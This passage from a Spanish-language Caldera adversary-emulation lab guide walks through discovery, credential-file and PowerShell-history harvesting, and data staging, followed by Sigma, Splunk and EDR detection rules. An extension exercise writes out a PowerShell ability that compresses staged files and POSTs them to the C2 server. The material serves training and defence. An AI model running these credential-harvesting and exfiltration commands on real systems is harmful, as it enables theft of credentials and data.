- Útil para entrenamiento paso a paso

**Jitter "2/8"**
- Agrega ±2 segundos de variación aleatoria
- Ayuda a evadir detección basada en patrones de tiempo
- El segundo número (8) no se usa en versión actual

### Paso 3: Iniciar la operación

1. Hacer clic en el botón **"Start"**
2. La operación cambiará a estado **"running"**
3. La interfaz mostrará la vista de la cadena de ataque (attack chain)

### Paso 4: Observar la ejecución en tiempo real

#### Vista de cadena de ataque (Chain View)

La interfaz mostrará un grafo dirigido donde:

- **Nodos**: Representan habilidades ejecutadas
- **Colores**:
  - 🟢 **Verde**: Ejecución exitosa
  - 🟡 **Amarillo**: En ejecución
  - 🔴 **Rojo**: Falló
  - ⚪ **Gris**: Pendiente
- **Conexiones**: Indican dependencias y flujo de facts

#### Ejemplo de flujo del adversario "Check"

```
┌─────────────────────────┐
│ Enumerate System Info   │  (T1082)
│    (whoami, hostname)   │
└───────────┬─────────────┘
            │
            ▼
┌─────────────────────────┐
│ Network Configuration   │  (T1016)
│    (ifconfig, ipconfig) │
└───────────┬─────────────┘
            │
            ▼
┌─────────────────────────┐
│ Environment Variables   │  (T1082)
│        (env, set)       │
└─────────────────────────┘
```

### Paso 5: Examinar detalles de ejecución

1. **Hacer clic en un nodo** de la cadena de ataque
2. Se abrirá un panel lateral con información detallada:

#### Información del Link (Ejecución de habilidad)

| Sección             | Contenido                                                    |
| ------------------- | ------------------------------------------------------------ |
| **Ability**         | Nombre y descripción de la habilidad                         |
| **ATT&CK**          | Técnica y táctica (ej: T1082 - System Information Discovery) |
| **Command**         | Comando exacto ejecutado en el sistema                       |
| **Output**          | Resultado de la ejecución                                    |
| **Status**          | Estado (0=éxito, -1=fallo)                                   |
| **Facts Collected** | Datos extraídos por parsers                                  |

#### Ejemplo de comando ejecutado

**Habilidad**: Get System Information (Linux)

```bash
# Comando
whoami; hostname; uname -a; cat /etc/os-release

# Output
kali
ubuntu-lab
Linux ubuntu-lab 5.15.0-56-generic #62-Ubuntu SMP x86_64 GNU/Linux
NAME="Ubuntu"
VERSION="22.04.1 LTS (Jammy Jellyfish)"
ID=ubuntu
ID_LIKE=debian
```

**Facts descubiertos**:
- `host.user.name: kali`
- `host.name: ubuntu-lab`
- `host.os.kernel: 5.15.0-56-generic`

### Paso 6: Analizar facts recopilados

1. Hacer clic en la pestaña **"Facts"** dentro de la operación
2. Observar todos los facts descubiertos durante la operación

#### Tipos de facts comunes

| Trait                | Ejemplo         | Uso posterior                         |
| -------------------- | --------------- | ------------------------------------- |
| `host.user.name`     | `kali`          | Credenciales, contexto de privilegios |
| `host.name`          | `ubuntu-lab`    | Identificación de objetivo            |
| `remote.host.ip`     | `192.168.1.50`  | Movimiento lateral                    |
| `host.dir.staged`    | `/tmp/.caldera` | Almacenamiento temporal               |
| `network.adapter.ip` | `10.0.2.15`     | Mapeo de red                          |

#### Encadenamiento de facts

Los facts permiten que habilidades posteriores se adapten dinámicamente:

```yaml
# Habilidad 1 descubre IP remota
arp -a  →  Descubre: remote.host.ip = 192.168.1.50

# Habilidad 2 usa esa IP para copiar archivo
Copy-Item sandcat.exe \\#{remote.host.ip}\C$\Users\Public\
```

### Paso 7: Revisar mapeo ATT&CK

1. En la vista de operación, hacer clic en **"ATT&CK Coverage"** (si está disponible)
2. Alternativamente, usar el plugin **Compass** para visualizar cobertura

#### Técnicas ATT&CK ejecutadas por "Check"

| ID Técnica | Nombre                                 | Descripción                                       |
| ---------- | -------------------------------------- | ------------------------------------------------- |
| **T1082**  | System Information Discovery           | Recopilar información del sistema y configuración |
| **T1016**  | System Network Configuration Discovery | Descubrir configuración de red                    |
| **T1033**  | System Owner/User Discovery            | Identificar usuarios del sistema                  |
| **T1124**  | System Time Discovery                  | Obtener fecha/hora del sistema                    |

### Paso 8: Finalización de la operación

#### Estados finales posibles

- **finished**: Todas las habilidades ejecutadas exitosamente
- **out_of_time**: Timeout de operación alcanzado
- **paused**: Pausada manualmente por el operador

#### Acciones post-operación

1. **Descargar reporte**:
   - Hacer clic en **"Download Report"**
   - Formatos disponibles: JSON, CSV
   - Contiene timeline completo de ejecución

2. **Cleanup (Limpieza)**:
   - Hacer clic en botón **"Cleanup"**
   - Ejecuta comandos de limpieza definidos en habilidades
   - Elimina artefactos dejados en el sistema

### Paso 9: Análisis del reporte JSON

El reporte descargado contiene información estructurada:

```json
{
  "name": "Lab2-Discovery",
  "start": "2025-11-22T10:30:00",
  "finish": "2025-11-22T10:35:00",
  "steps": [
    {
      "ability_id": "4e97e699-93d7-4040-b5a3-2e906a58199e",
      "ability_name": "Get System Information",
      "tactic": "discovery",
      "technique_id": "T1082",
      "command": "whoami; hostname; uname -a",
      "output": "kali\nubuntu-lab\nLinux...",
      "status": 0,
      "timestamp": "2025-11-22T10:30:15"
    }
  ],
  "facts": {
    "host.user.name": ["kali"],
    "host.name": ["ubuntu-lab"]
  }
}
```

### Ejercicio avanzado: Operación manual paso a paso

Repetir la operación con configuración diferente:

1. Crear nueva operación: `Lab2-Discovery-Manual`
2. Configurar **Autonomous = 0** (manual)
3. Iniciar operación
4. Observar que las habilidades quedan en espera
5. Hacer clic en **"Run one link"** para ejecutar cada habilidad individualmente
6. Analizar resultados entre cada paso

#### Ventajas del modo manual

- Permite análisis profundo entre pasos
- Útil para entrenamiento y comprensión
- Posibilidad de modificar facts antes de siguiente paso

### Comparación con detección Blue Team

#### Telemetría generada (Perspectiva defensiva)

1. **Ejecución de procesos**:
   ```bash
   # Linux auditd logs
   type=EXECVE msg=audit(1234567890.123:456): argc=3 a0="whoami" a1="hostname" a2="uname"
   ```

2. **Logs de Sysmon (Windows)**:
   - Event ID 1: Process Creation (`whoami.exe`, `hostname.exe`)
   - Event ID 10: Process Access (acceso a LSASS si se ejecuta mimikatz)

3. **Comandos sospechosos en secuencia rápida**:
   - `whoami` → `hostname` → `ipconfig` → `net user`
   - Patrón típico de reconocimiento post-explotación

#### Reglas de detección Sigma (ejemplo)

```yaml
title: Rapid Discovery Commands Execution
description: Detects multiple discovery commands in short timeframe
status: experimental
logsource:
  category: process_creation
  product: linux
detection:
  selection:
    CommandLine|contains:
      - 'whoami'
      - 'hostname'
      - 'uname -a'
      - 'cat /etc/os-release'
  timeframe: 60s
  condition: selection | count(CommandLine) > 3
level: medium
```

### Preguntas de reflexión

1. ¿Qué facts fueron más valiosos para operaciones posteriores?
2. ¿Cómo se vería esta actividad en un SIEM?
3. ¿Qué técnicas adicionales ejecutaría un atacante real después de descubrimiento?
4. ¿Cómo podría ofuscarse esta actividad para evadir detección?

### Resultado esperado

Al finalizar este laboratorio, el estudiante habrá:

✓ Creado y ejecutado una operación completa en Caldera
✓ Observado la ejecución de técnicas ATT&CK en tiempo real
✓ Analizado facts descubiertos y su encadenamiento
✓ Comprendido el mapeo de acciones a framework ATT&CK
✓ Descargado y analizado reportes de operación
✓ Reflexionado sobre detección desde perspectiva Blue Team

<hr style="border: none; height: 10px; background-color: #003b00;" />

## <font color="#87CEEB">7. Laboratorio 3 - Simulación de ataque multi-etapa personalizado</font>

<hr style="border: none; height: 10px; background-color: #003b00;" />

### Objetivos del laboratorio

1. Crear un perfil de adversario personalizado
2. Construir una cadena de ataque multi-etapa
3. Ejecutar operación que simule un escenario de ataque real
4. Analizar el encadenamiento de técnicas y facts
5. Evaluar el impacto y cobertura ATT&CK

### Requisitos previos

- Completar Laboratorio 1 (agente desplegado)
- Completar Laboratorio 2 (comprensión de operaciones)
- Agente activo con privilegios de usuario estándar
- (Opcional) Segundo sistema para simular movimiento lateral

### Escenario del laboratorio

Se simulará un adversario que realiza las siguientes fases:

1. **Discovery (Descubrimiento)**: Reconocimiento del entorno
2. **Credential Access (Acceso a credenciales)**: Búsqueda de credenciales locales
3. **Collection (Recolección)**: Identificación de datos sensibles
4. **Exfiltration (Exfiltración)**: Simulación de extracción de datos

### Fase 1: Exploración de habilidades disponibles

#### Paso 1: Navegar al catálogo de habilidades

1. En Caldera, hacer clic en **"Abilities"** en el menú lateral
2. Explorar el catálogo organizado por tácticas ATT&CK
3. Utilizar filtros para buscar habilidades específicas

#### Paso 2: Seleccionar habilidades para el adversario

Para este laboratorio, se seleccionarán habilidades compatibles con **Windows** (ya que en la Sección 4 se preparó un entorno Windows):

##### Discovery (T1018, T1082, T1016)

| ID Habilidad                           | Nombre                          | Técnica | Plataforma  |
| -------------------------------------- | ------------------------------- | ------- | ----------- |
| `85341c8c-4ecb-4579-8f53-43e3e91d7617` | Collect ARP details             | T1018   | **Windows** |
| `c0da588f-79f0-4263-8998-7496b1a40596` | Find user                       | T1033   | **Windows** |
| `b6b105b9-41dc-490b-bc5c-80d699b82ce8` | Network Configuration Discovery | T1016   | **Windows** |

##### Credential Access (T1552, T1003)

| ID Habilidad                           | Nombre                      | Técnica   | Plataforma  |
| -------------------------------------- | --------------------------- | --------- | ----------- |
| `3796a00b-b11d-4731-b4ca-275a07d83299` | Find files with credentials | T1552.001 | **Windows** |
| `1b4fb81c-8090-426c-93ab-0a633e7a16a7` | PowerShell history search   | T1552.003 | **Windows** |

##### Collection (T1005, T1074)

| ID Habilidad                           | Nombre                   | Técnica   | Plataforma  |
| -------------------------------------- | ------------------------ | --------- | ----------- |
| `90c2efaa-8205-480d-8bb6-61d90dbaf81b` | Find sensitive files     | T1005     | **Windows** |
| `6469befa-748a-4b9c-a96d-f191fde47d89` | Create staging directory | T1074.001 | **Windows** |

### Fase 2: Crear adversario personalizado

#### Paso 1: Crear archivo YAML de adversario

En un entorno de desarrollo de Caldera, crear el archivo:
`/data/adversaries/custom-lab3-adversary.yml`

```yaml
---
id: aaaaaaaa-1111-2222-3333-bbbbbbbbbbbb
name: Lab3-DataThief-Windows
description: Adversario de laboratorio que simula descubrimiento, acceso a credenciales y recolección de datos en Windows
atomic_ordering:
  # Fase 1: Discovery
  - 85341c8c-4ecb-4579-8f53-43e3e91d7617  # Collect ARP details (T1018)
  - c0da588f-79f0-4263-8998-7496b1a40596  # Find user (T1033)
  - b6b105b9-41dc-490b-bc5c-80d699b82ce8  # Network Configuration Discovery (T1016)

  # Fase 2: Credential Access
  - 3796a00b-b11d-4731-b4ca-275a07d83299  # Find files with credentials (T1552.001)
  - 1b4fb81c-8090-426c-93ab-0a633e7a16a7  # PowerShell history search (T1552.003)

  # Fase 3: Collection
  - 90c2efaa-8205-480d-8bb6-61d90dbaf81b  # Find sensitive files (T1005)
  - 6469befa-748a-4b9c-a96d-f191fde47d89  # Create staged directory (T1074.001)
```

#### Paso 2: Cargar adversario en Caldera

**Opción A: Vía interfaz web**
1. Navegar a **"Adversaries"**
2. Hacer clic en **"+"** para crear nuevo adversario
3. Completar formulario manualmente seleccionando habilidades
4. Guardar con nombre `Lab3-DataThief`

**Opción B: Vía API REST**

```bash
curl -X POST http://localhost:8888/api/v2/adversaries \
  -H "KEY: ADMIN123" \
  -H "Content-Type: application/json" \
  -d @custom-lab3-adversary.json
```

**Opción C: Copiar archivo YAML** (más simple para laboratorio)

```bash
# Copiar archivo a directorio de adversarios de usuario
cp custom-lab3-adversary.yml /home/user/Caldera/5.3.0/data/adversaries/
```

Luego reiniciar Caldera o recargar configuración.

### Fase 3: Configurar fuente de facts inicial (opcional)

Para un escenario más realista, se pueden definir facts iniciales que el adversario "conocería":

Archivo: `/data/sources/lab3-initial-knowledge.yml`

```yaml
---
id: bbbbbbbb-2222-3333-4444-cccccccccccc
name: Lab3-InitialKnowledge
facts:
  - trait: host.user.name
    value: kali
  - trait: network.domain.name
    value: lab.local
  - trait: caldera.server.ip
    value: 192.168.1.100
```

### Fase 4: Ejecutar la operación personalizada

#### Paso 1: Crear operación

1. Navegar a **"Operations"**
2. Hacer clic en **"+"**
3. Configurar:

| Campo          | Valor                                |
| -------------- | ------------------------------------ |
| **Name**       | `Lab3-DataTheft-Simulation`          |
| **Adversary**  | `Lab3-DataThief`                     |
| **Group**      | `red`                                |
| **Planner**    | `atomic`                             |
| **Source**     | `Lab3-InitialKnowledge` (si se creó) |
| **Autonomous** | `1`                                  |
| **Obfuscator** | `plain-text`                         |
| **Jitter**     | `4/8`                                |

#### Paso 2: Iniciar y monitorear

1. Hacer clic en **"Start"**
2. Observar la cadena de ataque que se construye en tiempo real
3. Monitorear el progreso por fases

### Fase 5: Análisis detallado de cada fase

#### Fase 1: Discovery (Descubrimiento)

**Habilidad 1: Collect ARP details (T1018)**

```powershell
# Comando ejecutado (CMD/PowerShell)
arp -a

# Salida esperada (Windows)
Interface: 192.168.1.20 --- 0xb
  Internet Address      Physical Address      Type
  192.168.1.1           00-0c-29-3e-1f-4a     dynamic
  192.168.1.50          00-0c-29-4f-2e-5b     dynamic
  192.168.1.100         00-0c-29-5g-3f-6c     dynamic

# Facts descubiertos
remote.host.ip: 192.168.1.1
remote.host.ip: 192.168.1.50
remote.host.ip: 192.168.1.100
```

**Uso táctico**: Mapear hosts activos en la red local para potencial movimiento lateral vía SMB, RDP, WinRM.

**Habilidad 2: Find user (T1033)**

```powershell
# Comando ejecutado (PowerShell)
whoami; hostname; systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type"

# Salida esperada
WIN10-LAB\student
WIN10-LAB
OS Name:                   Microsoft Windows 10 Enterprise
OS Version:                10.0.19045 N/A Build 19045
System Type:               x64-based PC

# Facts descubiertos
host.user.name: student
host.name: WIN10-LAB
host.os.name: Microsoft Windows 10 Enterprise
host.os.version: 10.0.19045
```

**Uso táctico**: Determinar contexto de privilegios (usuario estándar vs admin) y versión de Windows para adaptar técnicas de escalación posteriores.

**Habilidad 3: Network Configuration Discovery (T1016)**

```powershell
# Comando ejecutado (PowerShell)
ipconfig /all

# Salida esperada (simplificada)
Ethernet adapter Ethernet0:
   IPv4 Address. . . . . . . . . . . : 192.168.1.20
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : 192.168.1.1

# Facts descubiertos
network.adapter.ip: 192.168.1.20
network.gateway: 192.168.1.1
network.dns.server: 192.168.1.1
```

**Uso táctico**: Identificar segmentos de red, gateways y servidores DNS para mapeo de red corporativa.

#### Fase 2: Credential Access (Acceso a credenciales)

**Habilidad 4: Find files with credentials (T1552.001)**

```powershell
# Comando ejecutado (PowerShell)
Get-ChildItem C:\Users -Recurse -Include *.rdp,*.ppk,*.kdbx,*credential*,*password*.txt,*.config -ErrorAction SilentlyContinue | Select-Object FullName

# Salida esperada
FullName
--------
C:\Users\student\Documents\passwords.txt
C:\Users\student\Desktop\VPN_credentials.txt
C:\Users\student\AppData\Local\Microsoft\Remote Desktop\Default.rdp
C:\Users\student\Downloads\KeePass_Database.kdbx

# Facts descubiertos
host.file.path: C:\Users\student\Documents\passwords.txt
host.file.path: C:\Users\student\Desktop\VPN_credentials.txt
host.file.path: C:\Users\student\AppData\Local\Microsoft\Remote Desktop\Default.rdp
host.file.path: C:\Users\student\Downloads\KeePass_Database.kdbx
```

**Uso táctico**: Archivos RDP contienen credenciales guardadas, KeePass son bases de datos de passwords, archivos .txt pueden contener credenciales en texto plano.

**Habilidad 5: PowerShell history search (T1552.003)**

```powershell
# Comando ejecutado (PowerShell)
Get-Content (Get-PSReadlineOption).HistorySavePath | Select-String -Pattern "password","credential","ConvertTo-SecureString","psexec","net use"

# Salida potencial
net use \\192.168.1.50\C$ /user:administrator P@ssw0rd123
Invoke-Command -ComputerName DC01 -Credential (Get-Credential admin)
$SecurePassword = ConvertTo-SecureString "MySecretP@ss!" -AsPlainText -Force

# Facts descubiertos
credential.user: administrator
credential.password: P@ssw0rd123
remote.host.ip: 192.168.1.50
remote.host.name: DC01
```

**Uso táctico**: El historial de PowerShell frecuentemente contiene credenciales de administradores ejecutando comandos remotos, conexiones a shares SMB, o automatización con credenciales hard-coded.

#### Fase 3: Collection (Recolección)

**Habilidad 6: Find sensitive files (T1005)**

```powershell
# Comando ejecutado (PowerShell)
Get-ChildItem C:\Users -Recurse -Include *password*,*secret*,*confidential*,*.xlsx,*.docx,*.pdf -File -ErrorAction SilentlyContinue | Where-Object {$_.Length -lt 10MB} | Select-Object FullName,Length

# Salida esperada
FullName                                                     Length
--------                                                     ------
C:\Users\student\Documents\Q4_Financial_Report.xlsx         245760
C:\Users\student\Documents\passwords.txt                    1523
C:\Users\student\Documents\Customer_Database.xlsx           892416
C:\Users\student\Desktop\Confidential_Project_Plan.docx     156234

# Facts descubiertos
file.sensitive.path: C:\Users\student\Documents\Q4_Financial_Report.xlsx
file.sensitive.path: C:\Users\student\Documents\passwords.txt
file.sensitive.path: C:\Users\student\Documents\Customer_Database.xlsx
file.sensitive.path: C:\Users\student\Desktop\Confidential_Project_Plan.docx
```

**Uso táctico**: Identificar documentos de alto valor (financieros, bases de datos de clientes, planes estratégicos) para exfiltración. El filtro de tamaño (<10MB) asegura que sean archivos transferibles rápidamente.

**Habilidad 7: Create staged directory (T1074.001)**

```powershell
# Comando ejecutado (PowerShell)
New-Item -Path "C:\Windows\Temp\.staging" -ItemType Directory -Force | Out-Null

# Facts descubiertos
host.dir.staged: C:\Windows\Temp\.staging
```

**Uso táctico**: Directorio oculto en ubicación de sistema (C:\Windows\Temp) para agrupar archivos antes de exfiltración. Esta es una técnica real usada por APTs como APT28 y FIN7 para consolidar datos antes de compresión y extracción.

### Fase 6: Visualización de la cadena de ataque

La cadena de ataque mostrará el flujo completo:

```
[T1018 ARP Scan] → Descubre IPs remotas (SMB/RDP targets)
       ↓
[T1033 Find User] → Descubre usuario/privilegios Windows
       ↓
[T1016 Network Config] → Descubre adaptadores y gateways
       ↓
[T1552.001 Credential Files] → Encuentra archivos RDP, KeePass, passwords.txt
       ↓
[T1552.003 PowerShell History] → Extrae credenciales del historial PSReadLine
       ↓
[T1005 Sensitive Files] → Identifica documentos Office (.xlsx, .docx, .pdf)
       ↓
[T1074.001 Staging Dir] → Crea C:\Windows\Temp\.staging para consolidar
```

### Fase 7: Análisis de cobertura ATT&CK

#### Matriz de cobertura

| Táctica             | Técnicas cubiertas            | % de sub-técnicas |
| ------------------- | ----------------------------- | ----------------- |
| Discovery           | T1018, T1033, T1016           | 3/30 (10%)        |
| Credential Access   | T1552.001, T1552.003          | 2/13 (15%)        |
| Collection          | T1005, T1074.001              | 2/17 (12%)        |
| Command and Control | T1071 (implícito por C2 HTTP) | 1/16 (6%)         |

**Observación**: Este adversario cubre 4 de 14 tácticas ATT&CK, con enfoque en fases tempranas del kill chain (reconocimiento, robo de credenciales, recolección de datos).

### Fase 8: Simulación de defensa (Perspectiva Blue Team)

#### Telemetría generada (Windows con Sysmon)

1. **Logs de comandos ejecutados** (Sysmon Event ID 1 - Process Creation):
   ```
   EventID: 1 - Process Create
   10:45:12 - arp.exe -a
   10:45:18 - whoami.exe
   10:45:19 - hostname.exe
   10:45:20 - systeminfo.exe
   10:45:22 - ipconfig.exe /all
   10:45:25 - powershell.exe Get-ChildItem C:\Users -Recurse -Include *.rdp,*.ppk,*.kdbx
   10:45:30 - powershell.exe Get-Content (Get-PSReadlineOption).HistorySavePath
   10:45:35 - powershell.exe Get-ChildItem C:\Users -Recurse -Include *password*,*confidential*
   ```

2. **Accesos a archivos sensibles** (Sysmon Event ID 11 - File Creation):
   ```
   EventID: 11 - FileCreate
   TargetFilename: C:\Windows\Temp\.staging\
   Image: powershell.exe
   User: WIN10-LAB\student
   ```

3. **Acceso a archivos de credenciales** (Sysmon Event ID 15 - Alternate Data Stream Created / File Access Auditing):
   ```
   File Access: C:\Users\student\Documents\passwords.txt
   File Access: C:\Users\student\AppData\Local\Microsoft\Remote Desktop\Default.rdp
   File Access: C:\Users\student\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
   ```

4. **PowerShell Script Block Logging** (Event ID 4104):
   ```
   Get-Content (Get-PSReadlineOption).HistorySavePath | Select-String -Pattern "password"
   Get-ChildItem C:\Users -Recurse -Include *.rdp,*.ppk,*.kdbx
   New-Item -Path "C:\Windows\Temp\.staging"
   ```

#### Reglas de detección recomendadas

**Sigma Rule 1: Credential File Enumeration (Windows)**

```yaml
title: Suspicious Credential File Enumeration on Windows
description: Detects PowerShell searching for credential files (RDP, KeePass, password files)
status: experimental
logsource:
  product: windows
  category: process_creation
detection:
  selection_powershell:
    Image|endswith: '\powershell.exe'
    CommandLine|contains:
      - 'Get-ChildItem'
      - '-Recurse'
  selection_keywords:
    CommandLine|contains:
      - '.rdp'
      - '.ppk'
      - '.kdbx'
      - '*password*'
      - '*credential*'
      - 'KeePass'
  condition: selection_powershell and selection_keywords
falsepositives:
  - Scripts legítimos de administración
  - Herramientas de auditoría autorizadas
level: medium
tags:
  - attack.credential_access
  - attack.t1552.004
  - attack.t1552.003
```

**Sigma Rule 2: PowerShell History Access for Credential Theft**

```yaml
title: PowerShell History File Access for Credential Harvesting
description: Detects access to PowerShell command history file which may contain credentials
status: experimental
logsource:
  product: windows
  category: process_creation
detection:
  selection:
    CommandLine|contains:
      - 'ConsoleHost_history.txt'
      - 'Get-PSReadlineOption'
      - 'PSReadLine'
  filter_legitimate:
    Image|endswith:
      - '\powershell_ise.exe'  # Legitimate ISE access
  condition: selection and not filter_legitimate
falsepositives:
  - PowerShell ISE usage legítimo
  - Scripts de respaldo autorizados
level: high
tags:
  - attack.credential_access
  - attack.t1552.003
  - attack.collection
```

**EDR Alert: Rapid Discovery Commands (Windows)**

Un EDR/XDR configurado adecuadamente debería alertar sobre:
- **Secuencia rápida de comandos de enumeración**: arp, whoami, hostname, systeminfo, ipconfig en <2 minutos
- **Acceso al historial de PowerShell** por proceso no interactivo (no desde consola directa del usuario)
- **PowerShell recursivo en C:\Users** buscando patrones de credenciales (*.rdp, *.ppk, *password*)
- **Creación de directorios ocultos** en C:\Windows\Temp (especialmente con prefijo ".")
- **PowerShell Script Block Logging** mostrando comandos de enumeración sospechosos

**Queries de búsqueda en SIEM (Splunk)**

```spl
# Buscar secuencia de comandos de descubrimiento
index=windows source="WinEventLog:Microsoft-Windows-Sysmon/Operational" EventCode=1
| search (Image="*\\arp.exe" OR Image="*\\whoami.exe" OR Image="*\\hostname.exe" OR Image="*\\systeminfo.exe" OR Image="*\\ipconfig.exe")
| stats count by Computer, User, Image
| where count > 3
```

### Ejercicio de extensión

#### Agregar fase de exfiltración (Windows)

Modificar el adversario para incluir fase de exfiltración vía PowerShell:

```yaml
# Fase 4: Exfiltration (agregar al adversario)
  - a1b2c3d4-5678-90ab-cdef-1234567890ab  # Compress and exfil via HTTP POST
```

**Habilidad de exfiltración Windows** (ejemplo):

```yaml
name: Compress and Exfiltrate Staged Data (Windows)
description: Comprimir archivos del directorio de staging y exfiltrar vía HTTP POST
tactic: exfiltration
technique:
  attack_id: T1041
  name: Exfiltration Over C2 Channel
platforms:
  windows:
    psh:
      command: |
        $stagingDir = "#{host.dir.staged}"
        $zipFile = "$env:TEMP\data_$(Get-Date -Format 'yyyyMMdd_HHmmss').zip"
        Compress-Archive -Path $stagingDir\* -DestinationPath $zipFile -Force
        $bytes = [System.IO.File]::ReadAllBytes($zipFile)
        $base64 = [System.Convert]::ToBase64String($bytes)
        Invoke-WebRequest -Uri "http://#{caldera.server.ip}:8888/file/upload" -Method POST -Body $base64
      cleanup: |
        Remove-Item "$env:TEMP\data_*.zip" -Force -ErrorAction SilentlyContinue
        Remove-Item "#{host.dir.staged}" -Recurse -Force -ErrorAction SilentlyContinue
```

**Detección de exfiltración**:
- **Sysmon Event ID 3** (Network Connection): PowerShell realizando POST a IP externa
- **Sysmon Event ID 11** (File Creation): Creación de archivos .zip en %TEMP%
- **Tamaño de tráfico anómalo**: Uploads HTTP de varios MB desde endpoints

### Preguntas de reflexión

1. ¿Cómo se encadenaron los facts entre habilidades?
2. ¿Qué técnica fue más ruidosa desde perspectiva de detección?
3. ¿Cómo podría un atacante real ofuscar estos comandos?
4. ¿Qué controles de seguridad prevendrían esta cadena de ataque?
5. ¿Qué técnicas adicionales completarían un ataque de ransomware?

### Resultado esperado

Al finalizar este laboratorio, el estudiante habrá:

✓ Creado un adversario personalizado con múltiples fases
✓ Ejecutado operación multi-etapa que simula ataque real
✓ Analizado encadenamiento de técnicas y facts
✓ Comprendido cobertura ATT&CK de un adversario
✓ Evaluado telemetría generada desde perspectiva defensiva
✓ Reflexionado sobre detección y prevención

<hr style="border: none; height: 10px; background-color: #003b00;" />

## <font color="#87CEEB">8. Análisis de resultados y perspectiva Purple Team</font>

<hr style="border: none; height: 10px; background-color: #003b00;" />

### Comprensión del flujo Purple Team

El concepto de **Purple Team** surge de la colaboración entre:

- 🔴 **Red Team**: Emula adversarios para probar defensas
- 🔵 **Blue Team**: Detecta, responde y mejora defensas
- 🟣 **Purple Team**: Facilita colaboración y aprendizaje mutuo

Caldera es una herramienta ideal para ejercicios Purple Team porque:

1. **Ataques reproducibles**: Mismas técnicas pueden repetirse para validar mejoras
2. **Telemetría documentada**: Salida conocida facilita creación de reglas de detección
3. **Mapeo ATT&CK**: Lenguaje común entre atacantes y defensores
4. **Control total**: Operaciones controladas en entorno seguro

### Análisis de resultados de operación

#### Descarga y formato de reportes

Caldera proporciona múltiples formatos de reporte:

1. **JSON (Estructurado)**:
   - Ideal para análisis automatizado
   - Puede importarse en SIEM o herramientas de análisis
   - Contiene metadata completa de cada link

2. **CSV (Tabular)**:
   - Fácil de importar en hojas de cálculo
   - Útil para análisis estadístico
   - Columnas: timestamp, ability, command, output, status

#### Estructura del reporte JSON

```json
{
  "operation": {
    "name": "Lab3-DataTheft-Simulation",
    "start_time": "2025-11-22T10:00:00Z",
    "finish_time": "2025-11-22T10:15:00Z",
    "adversary": "Lab3-DataThief",
    "jitter": "4/8",
    "planner": "atomic",
    "state": "finished"
  },
  "agents": [
    {
      "paw": "c3f4a7b2",
      "hostname": "ubuntu-lab",
      "platform": "linux",
      "executors": ["sh", "bash"],
      "privilege": "User"
    }
  ],
  "links": [
    {
      "id": "link-001",
      "ability": {
        "ability_id": "85341c8c-4ecb-4579-8f53-43e3e91d7617",
        "name": "Collect ARP details",
        "tactic": "discovery",
        "technique_id": "T1018",
        "technique_name": "Remote System Discovery"
      },
      "executor": "sh",
      "command": "arp -a",
      "output": "? (192.168.1.1) at 00:0c:29:3e:1f:4a...",
      "status": 0,
      "timestamp": "2025-11-22T10:01:15Z",
      "facts": [
        {"trait": "remote.host.ip", "value": "192.168.1.1"},
        {"trait": "remote.host.ip", "value": "192.168.1.50"}
      ]
    }
  ],
  "facts_discovered": {
    "remote.host.ip": ["192.168.1.1", "192.168.1.50", "192.168.1.100"],
    "host.user.name": ["kali"],
    "host.file.path": ["/home/kali/.ssh/id_rsa"]
  }
}
```

### Uso del Plugin Debrief

El plugin **Debrief** proporciona análisis detallado post-operación.

#### Acceso a Debrief

1. Navegar a **Plugins** → **Debrief**
2. Seleccionar operación completada
3. Generar reporte de debriefing

#### Secciones del reporte Debrief

1. **Executive Summary**:
   - Duración de la operación
   - Número de técnicas ejecutadas
   - Tasa de éxito
   - Cobertura ATT&CK

2. **Timeline de ejecución**:
   - Visualización cronológica de técnicas
   - Identificación de cuellos de botella
   - Tiempo entre habilidades

3. **Facts Discovery**:
   - Árbol de dependencias de facts
   - Visualización de encadenamiento
   - Facts más valiosos

4. **Agent Performance**:
   - Estadísticas por agente
   - Tasa de éxito de comandos
   - Latencia de comunicación C2

### Perspectiva Red Team: Evaluación de operación

#### Métricas de éxito

| Métrica             | Pregunta clave                                     | Evaluación |
| ------------------- | -------------------------------------------------- | ---------- |
| **Completitud**     | ¿Se ejecutaron todas las habilidades planificadas? | Sí/No      |
| **Tasa de éxito**   | ¿Qué porcentaje de comandos tuvieron éxito?        | 85%        |
| **Facts obtenidos** | ¿Se descubrieron facts útiles para escalar?        | 15 facts   |
| **Tiempo total**    | ¿Cuánto duró la operación completa?                | 15 min     |
| **Detección**       | ¿La operación fue detectada por Blue Team?         | ¿?         |

#### Análisis de fallas

Si una habilidad falló, analizar:

1. **Causa técnica**: ¿Error de comando, dependencia faltante?
2. **Dependencia de facts**: ¿Faltaba un fact requerido?
3. **Privilegios insuficientes**: ¿Se requería escalación?
4. **Plataforma incorrecta**: ¿Comando no compatible con OS?

#### Optimización de adversario

Basado en resultados, refinar el adversario:

```yaml
# Agregar habilidades alternativas para mayor flexibilidad
atomic_ordering:
  - ability_id_primary
  - ability_id_fallback  # Si primary falla
```

### Perspectiva Blue Team: Detección y respuesta

#### Correlación con SIEM

Importar telemetría del sistema objetivo al SIEM durante la operación:

**Fuentes de telemetría recomendadas**:

1. **Linux**:
   - auditd logs (`/var/log/audit/audit.log`)
   - Syslog (`/var/log/syslog`)
   - Osquery (consultas de seguridad)

2. **Windows**:
   - Sysmon (Event IDs 1, 3, 7, 10, 11, 13)
   - Windows Security Event Log (4688, 4689)
   - PowerShell Script Block Logging (4104)

#### Ejemplo: Búsqueda en Splunk

```spl
index=linux source="/var/log/audit/audit.log"
| search type=EXECVE
| eval cmdline=a0." ".a1." ".a2
| search cmdline="arp -a" OR cmdline="whoami" OR cmdline="hostname"
| stats count by cmdline, _time, host
| where count > 2
```

**Resultado esperado**: Detección de múltiples comandos de descubrimiento en corto período.

#### Desarrollo de reglas de detección

**Ejemplo: Sigma Rule**

```yaml
title: Caldera-like Discovery Command Sequence
description: Detecta secuencia de comandos típica de emulación de adversarios Caldera
status: experimental
date: 2025/11/22
author: Blue Team Lab
logsource:
  product: linux
  category: process_creation
detection:
  selection:
    Image|endswith:
      - '/arp'
      - '/whoami'
      - '/hostname'
      - '/uname'
      - '/ifconfig'
      - '/ip'
  timeframe: 120s
  condition: selection | count() > 4
fields:
  - CommandLine
  - User
  - ParentImage
falsepositives:
  - Scripts de administración legítimos
  - Herramientas de inventario
level: medium
tags:
  - attack.discovery
  - attack.t1018
  - attack.t1082
  - attack.t1016
```

#### Mapeo a MITRE D3FEND

